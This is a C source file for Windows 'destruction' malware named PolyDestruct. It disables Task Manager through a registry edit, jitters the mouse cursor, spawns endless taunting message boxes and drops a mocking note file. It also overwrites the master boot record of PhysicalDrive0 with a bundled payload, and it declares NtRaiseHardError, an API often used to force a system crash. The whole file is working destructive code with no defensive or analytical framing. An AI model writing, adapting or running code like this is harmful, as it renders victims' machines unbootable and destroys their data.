#include "Bootrec.h"

/* idk
*/;

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Response);

void DisableTaskManager() {
	ShellExecuteA(NULL, "open", "reg", "add hkcu\\software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f", NULL, SW_HIDE);
}

DWORD CALLBACK MoveCursor(LPVOID cur) {
	POINT cursor;
	int x, y;
	while (true) {
		GetCursorPos(&cursor);
		x = cursor.x + (rand () % 2) + 1, y = cursor.y + (rand () % 3) + 1;
		SetCursorPos(x, y);
		Sleep(10);
	}
}

DWORD WINAPI msgbox(LPVOID msg) {
	while (1) {
	
	MessageBoxA(NULL, "Your PC has been destroyed by PolyDestruct.\r\nEnjoy the hell.", "lmao", MB_OK | MB_ICONASTERISK);
	Sleep(20000);
}
}

void OverwriteBootRecord() {
	DWORD written;
	HANDLE hBootRecord = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
	WriteFile(hBootRecord, bootrec, 4096, &written, 0);
}

void CreateDestructionNote() {
	const char notepad[] = "PolyDestruct has now destroyed your PC!\r\nEnjoy the hell!";
	CreateDirectoryA("C:\\fucked", NULL);
	HANDLE hNotepad = CreateFileA("C:\\fucked\\message.txt", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hNotepad != INVALID_HANDLE_VALUE) {
		DWORD bruh;
		if (notepad == INVALID_HANDLE_VALUE)
			ExitProcess(4);
		if (!WriteFile(hNotepad, notepad, lstrlenA(notepad), &bruh, NULL));
			ExitProcess(5);
		CloseHandle(hNotepad);
		ShellExecuteA(NULL, "open", "notepad", "C:\\fucked\\message.txt", NULL, SW_HIDE);	
	}
}

